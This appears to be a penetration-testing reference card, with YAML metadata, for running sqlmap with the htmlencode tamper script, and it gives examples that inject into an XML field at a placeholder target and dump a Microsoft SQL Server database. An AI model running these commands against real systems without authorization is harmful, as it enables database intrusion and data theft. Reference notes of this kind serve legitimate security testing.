---
data: sqlmap --tamper htmlencode
tags:
  - sql-injection
  - tamper
type: command
executor: bash
platforms:
  - Linux
  - Windows
id: bdcfdb73-c341-4b6a-9307-5580226ec5e5
created_at: '2025-12-11T06:10:30.785Z'
updated_at: '2025-12-11T06:10:30.785Z'
verified: false
validated: true
submitted: true
---
# sqlmap-tamper-htmlencode

## Command

```bash
sqlmap --tamper htmlencode
```

## Description

This command runs sqlmap with the htmlencode tamper script to escape special characters for XML compatibility, automating SQL injection exploitation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `--tamper` | Specifies the tamper script 'htmlencode' to escape special characters for XML | Yes |

## Examples

### Basic Usage

```bash
sqlmap --tamper htmlencode -u "https://target/upload" --data "xml=<MainAccount>payload</MainAccount>"
```

### Advanced Usage

```bash
sqlmap --tamper htmlencode --dbms mssql --dump
```

## Expected Output

Confirmation of SQL injection vulnerability and database details like version (Microsoft SQL Server 2012).

## Related

- [[procedures/Automate-SQL-Injection-with-sqlmap]]
- [[tools/sqlmap]]
